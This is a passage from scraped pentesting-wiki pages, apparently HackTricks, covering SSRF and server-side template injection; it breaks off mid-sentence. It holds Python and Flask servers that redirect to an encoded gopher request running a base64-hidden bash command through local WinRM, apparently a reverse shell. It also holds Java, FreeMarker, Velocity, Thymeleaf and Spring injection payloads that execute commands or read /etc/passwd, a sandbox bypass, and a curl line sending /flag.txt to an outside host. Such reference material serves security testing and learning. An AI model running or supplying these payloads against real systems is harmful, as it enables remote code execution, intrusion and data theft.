-nodes\nfrom\nhttp\n.\nserver\nimport\nHTTPServer\n,\nBaseHTTPRequestHandler\nimport\nssl\n‚Äã\nclass\nMainHandler\n(\nBaseHTTPRequestHandler\n):\ndef\ndo_GET\n(\nself\n):\nprint\n(\n\"GET\"\n)\nself\n.\nsend_response\n(\n301\n)\nself\n.\nsend_header\n(\n\"Location\"\n,\n\"gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a\"\n)\nself\n.\nend_headers\n()\n‚Äã\nhttpd\n=\nHTTPServer\n((\n'0.0.0.0'\n,\n443\n),\nMainHandler\n)\nhttpd\n.\nsocket\n=\nssl\n.\nwrap_socket\n(\nhttpd\n.\nsocket\n,\ncertfile\n=\n\"server.pem\"\n,\nserver_side\n=\nTrue\n)\nhttpd\n.\nserve_forever\n()\nfrom\nflask\nimport\nFlask\n,\nredirect\nfrom\nurllib\n.\nparse\nimport\nquote\napp\n=\nFlask\n(\n__name__\n)\n‚Äã\n@app\n.\nroute\n(\n'/'\n)\ndef\nroot\n():\nreturn\nredirect\n(\n'gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20'\n,\ncode\n=\n301\n)\nif\n__name__\n==\n\"__main__\"\n:\napp\n.\nrun\n(\nssl_context\n=\n'adhoc'\n,\ndebug\n=\nTrue\n,\nhost\n=\n\"0.0.0.0\"\n,\nport\n=\n8443\n)\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nDNS Rebidding CORS/SOP bypass\nIf you are having\nproblems\nto\nexfiltrate content from a local IP\nbecause of\nCORS/SOP\n,\nDNS Rebidding\ncan be used to bypass that limitation:\nCORS - Misconfigurations & Bypass\nAutomated DNS Rebidding\n‚Äã\nSingularity of Origin\nis a tool to perform\nDNS rebinding\nattacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine.\nCheck out also the\npublicly running server in\nhttp://rebind.it/singularity.html\n****\nDNS Rebidding + TLS Session ID/Session ticket\nRequirements:\nSSRF\nOutbound TLS sessions\nStuff on local ports\nAttack:\n1.\nAsk the user/bot\naccess\na\ndomain\ncontrolled by the\nattacker\n2.\nThe\nTTL\nof the\nDNS\nis\n0\nsec (so the victim will check the IP of the domain again soon)\n3.\nA\nTLS connection\nis created between the victim and the domain of the attacker. The attacker introduces the\npayload inside\nthe\nSession ID or Session Ticket\n.\n4.\nThe\ndomain\nwill start an\ninfinite loop\nof redirects against\nhimself\n. The goal of this is to make the user/bot access the domain until it perform\nagain\na\nDNS request\nof the domain.\n5.\nIn the DNS request a\nprivate IP\naddress is given\nnow\n(127.0.0.1 for example)\n6.\nThe user/bot will try to\nreestablish the TLS connection\nand in order to do so it will\nsend\nthe\nSession\nID/Ticket ID (where the\npayload\nof the attacker was contained). So congratulations you managed to ask the\nuser/bot attack himself\n.\nNote that during this attack, if you want to attack localhost:11211 (\nmemcache\n) you need to make the victim establish the initial connection with www.attacker.com:11211 (the\nport must always be the same\n).\nTo\nperform this attack you can use the tool\n:\nhttps://github.com/jmdx/TLS-poison/\nFor\nmore information\ntake a look to the talk where this attack is explained:\nhttps://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference\n‚Äã\nBlind SSRF\nThe difference between a blind SSRF and a not blind one is that in the blind you cannot see the response of the SSRF request. Then, it is more difficult to exploit because you will be able to exploit only well-known vulnerabilities.\nTime based SSRF\nChecking the time\nof the responses from the server it might be\npossible to know if a resource exists or not\n(maybe it takes more time accessing an existing resource than accessing one that doesn't exist)\nCloud SSRF Exploitation\nIf you find a SSRF vulnerability in a machine running inside a cloud environment you might be able to obtain interesting information about the cloud environment and even credentials:\nCloud SSRF\nSSRF Vulnerable Platforms\nSeveral known platforms contains or has contained SSRF vulnerabilities, check them in:\nSSRF Vulnerable Platforms\nTools\n‚Äã\nSSRFMap\n‚Äã\nTool to detect and exploit SSRF vulnerabilities\n‚Äã\nGopherus\n‚Äã\n‚Äã\nBlog post on Gopherus\n‚Äã\nThis tool generates Gopher payloads for:\nMySQL\nPostgreSQL\nFastCGI\nRedis\nZabbix\nMemcache\n‚Äã\nremote-method-guesser\n‚Äã\n‚Äã\nBlog post on SSRF usage\n‚Äã\nremote-method-guesser\nis a\nJava RMI\nvulnerability scanner that supports attack operations for most common\nJava RMI\nvulnerabilities. Most of the available operations support the\n--ssrf\noption, to generate an\nSSRF\npayload for the requested operation. Together with the\n--gopher\noption, ready to use\ngopher\npayloads can be generated directly.\n‚Äã\nSSRF Proxy\n‚Äã\nSSRF Proxy is a multi-threaded HTTP proxy server designed to tunnel client HTTP traffic through HTTP servers vulnerable to Server-Side Request Forgery (SSRF).\nTo practice\nGitHub - incredibleindishell/SSRF_Vulnerable_Lab: This Lab contain the sample codes which are vulnerable to Server-Side Request Forgery attack\nGitHub\nReferences\n‚Äã\nhttps://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4\n‚Äã\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery\n‚Äã\n‚Äã\nhttps://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPrevious\nSecond Order Injection - SQLMap\nNext\nURL Format Bypass\nLast modified\n2mo ago"
    },
    {
        "title": "SSTI (Server Side Template Injection)",
        "url": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection",
        "text": "SSTI (Server Side Template Injection)\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nRootedCON\nis the most relevant cybersecurity event in\nSpain\nand one of the most important in\nEurope\n. With\nthe mission of promoting technical knowledge\n, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.\nRootedCON\nRootedCON\nWhat is server-side template injection?\nA server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.\nTemplate engines\nare designed to\ngenerate web\npages by\ncombining\nfixed\ntemplates with\nvolatile\ndata. Server-side template injection attacks can occur when\nuser input\nis concatenated directly\ninto a template\n, rather than passed in as data. This allows attackers to\ninject arbitrary template directives\nin order to manipulate the template engine, often enabling them to take\ncomplete control of the server\n.\nAn example of vulnerable code see the following one:\n$output\n=\n$twig\n->\nrender\n(\n\"Dear \"\n.\n$_GET\n[\n'name'\n]);\nIn the previous example\npart of the template\nitself is being\ndynamically generated\nusing the\nGET\nparameter\nname\n. As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the\nname\nparameter as follows:\nhttp://vulnerable-website.com/?name={{bad-stuff-here}}\nConstructing a server-side template injection attack\nDetect\nAs with any vulnerability, the first step towards exploitation is being able to find it. Perhaps the simplest initial approach is to try\nfuzzing the template\nby injecting a sequence of special characters commonly used in template expressions, such as the polyglot\n${{<%[%'\"}}%\\\n.\nIn order to check if the server is vulnerable you should\nspot the differences\nbetween the response with\nregular data\non the parameter and the\ngiven payload\n.\nIf an\nerror is thrown\nit will be quiet easy to figure out that\nthe server is vulnerable\nand even which\nengine is running\n. But you could also find a vulnerable server if you were\nexpecting\nit to\nreflect\nthe given payload and it is\nnot being reflected\nor if there are some\nmissing chars\nin the response.\nDetect - Plaintext context\nThe given input is being\nrendered and reflected\ninto the response. This is easily\nmistaken for a simple\nXSS\nvulnerability, but it's easy to differentiate if you try to set\nmathematical operations\nwithin a template expression:\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n${{7*7}}\n#{7*7}\n*{7*7}\nDetect - Code context\nIn these cases the\nuser input\nis being placed\nwithin\na\ntemplate expression\n:\nengine\n.\nrender\n(\n\"Hello {{\"\n+\ngreeting\n+\n\"}}\"\n,\ndata\n)\nThe URL access that page could be similar to:\nhttp://vulnerable-website.com/?greeting=data.username\nIf you\nchange\nthe\ngreeting\nparameter for a\ndifferent value\nthe\nresponse won't contain the username\n, but if you access something like:\nhttp://vulnerable-website.com/?greeting=data.username}}hello\nthen,\nthe response will contain the username\n(if the closing template expression chars were\n}}\n).\nIf an\nerror\nis thrown during these test, it will be easier to find that the server is vulnerable.\nIdentify\nOnce you have detected the template injection potential, the next step is to identify the template engine.\nAlthough there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters.\nIf you are lucky the server will be\nprinting the errors\nand you will be able to find the\nengine\nused\ninside\nthe errors. Some possible payloads that may cause errors:\n${}\n{{}}\n<%= %>\n${7/0}\n{{7/0}}\n<%= 7/0 %>\n${foobar}\n{{foobar}}\n<%= foobar %>\n${7*7}\n{{7*7}}\n``\nOtherwise, you'll need to manually\ntest different language-specific payloads\nand study how they are interpreted by the template engine. A common way of doing this is to inject arbitrary mathematical operations using syntax from different template engines. You can then observe whether they are successfully evaluated. To help with this process, you can use a decision tree similar to the following:\nExploit\nRead\nThe first step after finding template injection and identifying the template engine is to read the documentation. Key areas of interest are:\n'For Template Authors' sections covering basic syntax.\n'Security Considerations' - chances are whoever developed the app you're testing didn't read this, and it may contain some useful hints.\nLists of builtin methods, functions, filters, and variables.\nLists of extensions/plugins - some may be enabled by default.\nExplore\nAssuming no exploits have presented themselves, the next step is to\nexplore the environment\nto find out exactly what\nyou have access to\n. You can expect to find both\ndefault objects\nprovided by the template engine, and\napplication-specific objects\npassed in to the template by the developer. Many template systems expose a 'self' or namespace object containing everything in scope, and an idiomatic way to list an object's attributes and methods.\nIf there's no builtin self object you're going to have to bruteforce variable names using\nSecLists\nand Burp Intruder's wordlist collection.\nDeveloper-supplied objects are particularly likely to contain sensitive information, and may vary between different templates within an application, so this process should ideally be applied to every distinct template individually.\nAttack\nAt this point you should have a\nfirm idea of the attack surface available\nto you and be able to proceed with traditional security audit techniques, reviewing each function for exploitable vulnerabilities. It's important to approach this in the context of the wider application - some functions can be used to exploit application-specific features. The examples to follow will use template injection to trigger arbitrary object creation, arbitrary file read/write, remote file include, information disclosure and privilege escalation vulnerabilities.\nTools\n‚Äã\nTplmap\n‚Äã\npython2\n.\n7\n.\n/\ntplmap\n.\npy\n-\nu\n'http://www.target.com/page?name=John*'\n--\nos\n-\nshell\npython2\n.\n7\n.\n/\ntplmap\n.\npy\n-\nu\n\"http://192.168.56.101:3000/ti?user=*&comment=supercomment&link\"\npython2\n.\n7\n.\n/\ntplmap\n.\npy\n-\nu\n\"http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link\"\n--\nlevel\n5\n-\ne jade\nExploits\nGeneric\nIn this\nwordlist\nyou can find\nvariables defined\nin the environments of some of the engines mentioned below:\n‚Äã\nhttps://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt\n‚Äã\nJava\nJava - Basic injection\n$\n{\n7\n*\n7\n}\n$\n{{\n7\n*\n7\n}}\n$\n{\nclass\n.\ngetClassLoader\n()}\n$\n{\nclass\n.\ngetResource\n(\n\"\"\n).\ngetPath\n()}\n$\n{\nclass\n.\ngetResource\n(\n\"../../../../../index.htm\"\n).\ngetContent\n()}\nJava - Retrieve the system‚Äôs environment variables\n$\n{\nT\n(\njava\n.\nlang\n.\nSystem\n).\ngetenv\n()}\nJava - Retrieve /etc/passwd\n$\n{\nT\n(\njava\n.\nlang\n.\nRuntime\n).\ngetRuntime\n().\nexec\n(\n'cat etc\n/\npasswd'\n)}\n‚Äã\n$\n{\nT\n(\norg\n.\napache\n.\ncommons\n.\nio\n.\nIOUtils\n).\ntoString\n(\nT\n(\njava\n.\nlang\n.\nRuntime\n).\ngetRuntime\n().\nexec\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n99\n).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n97\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n116\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n32\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n47\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n101\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n116\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n99\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n47\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n112\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n97\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n115\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n115\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n119\n)).\nconcat\n(\nT\n(\njava\n.\nlang\n.\nCharacter\n).\ntoString\n(\n100\n))).\ngetInputStream\n())}\nFreeMarker (Java)\nYou can try your payloads at\nhttps://try.freemarker.apache.org\n‚Äã\n{{7*7}} = {{7*7}}\n${7*7} = 49\n#{7*7} = 49 -- (legacy)\n${7*'7'} Nothing\n${foobar}\n<\n#assign ex\n=\n\"freemarker.template.utility.Execute\"\n?\nnew\n()\n>\n$\n{\nex\n(\n\"id\"\n)}\n[\n#assign ex\n=\n'\nfreemarker\n.\ntemplate\n.\nutility\n.\nExecute\n'\n?\nnew\n()]\n$\n{\nex\n(\n'id'\n)}\n$\n{\n\"freemarker.template.utility.Execute\"\n?\nnew\n()(\n\"id\"\n)}\n‚Äã\n$\n{\nproduct\n.\ngetClass\n().\ngetProtectionDomain\n().\ngetCodeSource\n().\ngetLocation\n().\ntoURI\n().\nresolve\n(\n'\n/\nhome\n/\ncarlos\n/\nmy_password\n.\ntxt'\n).\ntoURL\n().\nopenStream\n().\nreadAllBytes\n()\n?\njoin\n(\n\" \"\n)}\nFreemarker - Sandbox bypass\n‚ö†Ô∏è only works on Freemarker versions below 2.3.30\n<\n#assign classloader\n=\narticle\n.\nclass\n.\nprotectionDomain\n.\nclassLoader\n>\n<\n#assign owc\n=\nclassloader\n.\nloadClass\n(\n\"freemarker.template.ObjectWrapper\"\n)\n>\n<\n#assign dwf\n=\nowc\n.\ngetField\n(\n\"DEFAULT_WRAPPER\"\n).\nget\n(\nnull\n)\n>\n<\n#assign ec\n=\nclassloader\n.\nloadClass\n(\n\"freemarker.template.utility.Execute\"\n)\n>\n$\n{\ndwf\n.\nnewInstance\n(\nec\n,\nnull\n)(\n\"id\"\n)}\nMore information\nIn FreeMarker section of\nhttps://portswigger.net/research/server-side-template-injection\n‚Äã\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker\n‚Äã\nVelocity (Java)\n#\nset\n(\n$str\n=\n$\nclass\n.\ninspect\n(\n\"java.lang.String\"\n).\ntype\n)\n#\nset\n(\n$chr\n=\n$\nclass\n.\ninspect\n(\n\"java.lang.Character\"\n).\ntype\n)\n#\nset\n(\n$ex\n=\n$\nclass\n.\ninspect\n(\n\"java.lang.Runtime\"\n).\ntype\n.\ngetRuntime\n().\nexec\n(\n\"whoami\"\n))\n$ex\n.\nwaitFor\n()\n#\nset\n(\n$out\n=\n$ex\n.\ngetInputStream\n())\n#\nforeach\n(\n$i in\n[\n1.\n.\n$out\n.\navailable\n()])\n$str\n.\nvalueOf\n(\n$chr\n.\ntoChars\n(\n$out\n.\nread\n()))\n#end\nMore information\nIn Velocity section of\nhttps://portswigger.net/research/server-side-template-injection\n‚Äã\n‚Äã\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity\n‚Äã\nThymeleaf (Java)\nThe typical test expression for SSTI is\n${7*7}\n. This expression works in Thymeleaf, too. If you want to achieve remote code execution, you can use one of the following test expressions:\nSpringEL:\n${T(java.lang.Runtime).getRuntime().exec('calc')}\nOGNL:\n${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(\"calc\")}\nHowever, as we mentioned before, expressions only work in special Thymeleaf attributes. If it‚Äôs necessary to use an expression in a different location in the template, Thymeleaf supports\nexpression inlining\n. To use this feature, you must put an expression within\n[[...]]\nor\n[(...)]\n(select one or the other depending on whether you need to escape special symbols). Therefore, a simple SSTI detection payload for Thymeleaf would be\n[[${7*7}]]\n.\nChances that the above detection payload would work are, however, very low. SSTI vulnerabilities usually happen when a template is dynamically generated in the code. Thymeleaf, by default, doesn‚Äôt allow such dynamically generated templates and all templates must be created earlier. Therefore, if a developer wants to create a template from a string\non the fly\n, they would need to create their own TemplateResolver. This is possible but happens very rarely.\nIf we take a deeper look into the documentation of the Thymeleaf template engine, we will find an interesting feature called\nexpression preprocessing\n. Expressions placed between double underscores (\n__...__\n) are preprocessed and the result of the preprocessing is used as part of the expression during regular processing. Here is an official example from Thymeleaf documentation:\n#\n{\nselection\n.\n__$\n{\nsel\n.\ncode\n}\n__\n}\nVulnerable example\n<\na\nth:\nhref\n=\n\"\n@{__${path}__}\n\"\nth:\ntitle\n=\n\"\n${title}\n\"\n>\n<\na\nth:\nhref\n=\n\"\n${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}\n\"\nth:\ntitle\n=\n'\npepito\n'\n>\n‚Äã\nhttp://localhost:8082/(7*7)\nhttp://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})\nMore information\n‚Äã\nhttps://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/\n‚Äã\nEL - Expression Language\nSpring Framework (Java)\n*\n{\nT\n(\norg\n.\napache\n.\ncommons\n.\nio\n.\nIOUtils\n).\ntoString\n(\nT\n(\njava\n.\nlang\n.\nRuntime\n).\ngetRuntime\n().\nexec\n(\n'id'\n).\ngetInputStream\n())}\nBypass filters\nMultiple variable expressions can be used, if\n${...}\ndoesn't work 